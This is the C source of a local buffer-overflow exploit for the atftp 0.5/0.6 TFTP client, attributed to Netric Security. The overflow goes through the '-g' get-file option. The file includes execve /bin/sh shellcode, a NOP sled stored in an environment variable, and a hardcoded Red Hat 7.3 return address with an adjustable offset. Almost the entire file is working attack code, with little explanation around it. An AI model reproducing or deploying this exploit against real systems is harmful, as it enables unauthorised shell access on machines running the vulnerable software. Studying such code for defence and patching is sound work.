/*  
 * atftp.0.5
 * atftp.0.6 - local proof of concept exploit
 * exploits an unchecked buffer in the "get file" option "-g"
 *
 * return addr tested on redhat 7.3 - 0xbffffbcc
 * 	change for other systems - ./k3 <offset>
 * 	
 * Netric Security(RESOURCE MATERIAL)
 * http://www.netric.org
 * written by sacrine
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define EGG	1024
#define BUFLEN	(356+9)
#define NOP	0x90
			/* eSDee's execve /bin/sh shellcode */
char shellcode[] = 
	"\x31\xc0"                      // xor    %eax,%eax
	"\x50"                          // push   %eax
	"\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
	"\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
	"\x89\xe3"                      // mov    %esp,%ebx
	"\x8d\x54\x24\x08"              // lea    0x8(%esp,1),%edx
	"\x50"                          // push   %eax
	"\x53"                          // push   %ebx
	"\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
	"\xb0\x0b"                      // mov    $0xb,%al
	"\xcd\x80";                     // int    $0x80

int main(int argc, char **argv[]) 
{
	unsigned long ret = 0xbffffbcc;
	char buf[BUFLEN];
	char egg[EGG];
	int c;
	char *ptr;
	long *ptr2;
	int i=0;

	if(argc>1) {
	       ret = ret - atol(argv[1]);
	}
	memset(buf,NOP,sizeof(buf));
	ptr=egg;
	for (i=0; i<1024-strlen(shellcode)-1;i++)*(ptr++) = '\x90';
	for (i=0; i<strlen(shellcode);i++)*(ptr++) = shellcode[i];
	egg[1024-1] = '\0';
	memcpy(egg,"EGG=",4);
	putenv(egg);

	ptr2 = buf;
	for(c = 0; c < sizeof(buf); c+=4)
		*(ptr2++) = ret;
	
fprintf(stdout,"------------------------------------------------(www.netric.org)\n");
fprintf(stdout,"         local atftp-0.x proof of concept exploit\n");
fprintf(stdout,"(sacrine)-------------------------------------------------------\n\n");
fprintf(stdout,"return addr: 0x%x\n",ret);
fprintf(stdout,"buffer     : %d\n\n",strlen(buf));

execl("atftp", "atftp","-g",buf, NULL);

return(0);
	
}
	

